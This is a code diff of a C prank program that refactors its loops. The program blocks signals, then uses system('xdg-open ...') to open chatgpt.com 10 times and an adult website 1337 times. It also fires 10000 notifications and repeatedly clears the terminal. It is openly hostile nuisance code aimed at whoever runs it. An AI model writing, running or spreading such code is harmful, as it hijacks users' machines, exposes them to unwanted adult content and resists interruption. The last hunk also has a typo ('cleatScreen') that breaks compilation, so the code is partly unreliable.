@@ -41,7 +41,7 @@ void funcOverflow()
 
 int main()
 {
-  short repeatLoop = 0; // TODO: replace "while(repeatLoop--) with for loops of varying criteria."
+  short repeatLoop = 0;
 
   // Okay so I wanted to block as many signals as I could, so this loop covers that.
   for(int i = 64; i > 0; i--) {
@@ -64,9 +64,8 @@ int main()
   displayText("it sucks ass! So I'll fire up ChatGPT now to make you suffer. :)");
 
   // Ruining browser history with ChatGPT
-  repeatLoop = 10;
 
-  while (repeatLoop--) {
+  for(int openGPT = 10; openGPT > 0; openGPT--) {
     system("xdg-open https://chatgpt.com");
   }
   sleep(5);
@@ -86,10 +85,8 @@ int main()
   displayText("\nHey I'm annoying, right? Just Ctrl+C!");
   sleep(6);
 
-  repeatLoop = 1337;
-
   // This one is pure evil.
-  while(repeatLoop--) {
+  for(int openHub = 1337; openHub > 0; openHub--) {
     system("xdg-open https://pornhub.com");
   }
 
@@ -106,9 +103,8 @@ int main()
   sleep(8);
 
   // Whoever runs this with notifications on, RIP eardrums.
-  repeatLoop = 10000;
 
-  while(repeatLoop--) {
+  for(int momoneMomo = 10000; momoneMomo > 0; momoneMomo--) {
     displayText("\nMomone Momo");
     usleep(1000);
   }
@@ -129,9 +125,8 @@ int main()
   sleep(10);
 
   // This next part is untested.
-  repeatLoop = 100;
 
-  while(repeatLoop--) {
+  for(int clearScreen = 100; clearScreen > 0; cleatScreen--) {
     displayText("\033[2J\033[1;1H");
     usleep(600000);
   }
